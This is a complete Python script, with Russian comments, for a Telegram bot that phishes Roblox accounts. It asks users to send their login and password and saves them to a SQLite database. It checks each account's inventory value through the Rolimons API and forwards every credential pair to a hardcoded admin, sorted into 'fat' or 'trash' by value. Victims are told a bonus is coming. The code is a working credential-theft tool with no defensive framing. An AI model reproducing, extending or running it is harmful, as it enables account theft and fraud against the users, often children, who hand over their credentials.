import os
import telebot
import sqlite3
import requests

TOKEN = os.environ.get("TELEGRAM_TOKEN")
ADMIN_ID = 8905541945  # ЗАМЕНИ НА СВОЙ ID

bot = telebot.TeleBot(TOKEN)

# Подключаем базу
conn = sqlite3.connect('logins.db', check_same_thread=False)
cur = conn.cursor()
cur.execute('''CREATE TABLE IF NOT EXISTS users 
               (id INTEGER PRIMARY KEY, login TEXT, password TEXT, value INTEGER)''')
conn.commit()

def get_inventory_value(username):
    try:
        url = f"https://www.rolimons.com/api/playeritems/{username}"
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            data = response.json()
            return data.get("value", 0)
    except:
        pass
    return 0

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, "🔪 Введи логин и пароль от Roblox через пробел")

@bot.message_handler(commands=['stats'])
def stats(message):
    if message.chat.id == ADMIN_ID:
        cur.execute('SELECT COUNT(*) FROM users')
        count = cur.fetchone()[0]
        bot.send_message(message.chat.id, f"📊 Всего аккаунтов: {count}")

@bot.message_handler(func=lambda m: True)
def get_data(message):
    try:
        login, password = message.text.split()
        value = get_inventory_value(login)
        cur.execute('INSERT INTO users (login, password, value) VALUES (?, ?, ?)', (login, password, value))
        conn.commit()
        
        if value >= 500:
            bot.send_message(ADMIN_ID, f"💎 ЖИРНЫЙ!\nЛогин: {login}\nПароль: {password}\nСтоимость: {value} Robux")
            bot.send_message(message.chat.id, "✅ Аккаунт принят! Ждите бонус.")
        else:
            bot.send_message(ADMIN_ID, f"💩 МУСОР!\nЛогин: {login}\nПароль: {password}\nСтоимость: {value} Robux")
            bot.send_message(message.chat.id, "❌ Аккаунт не подходит.")
    except:
        bot.send_message(message.chat.id, "❌ Ошибка! Пиши: логин пароль")

print("🔪 Бот запущен!")
bot.infinity_polling()
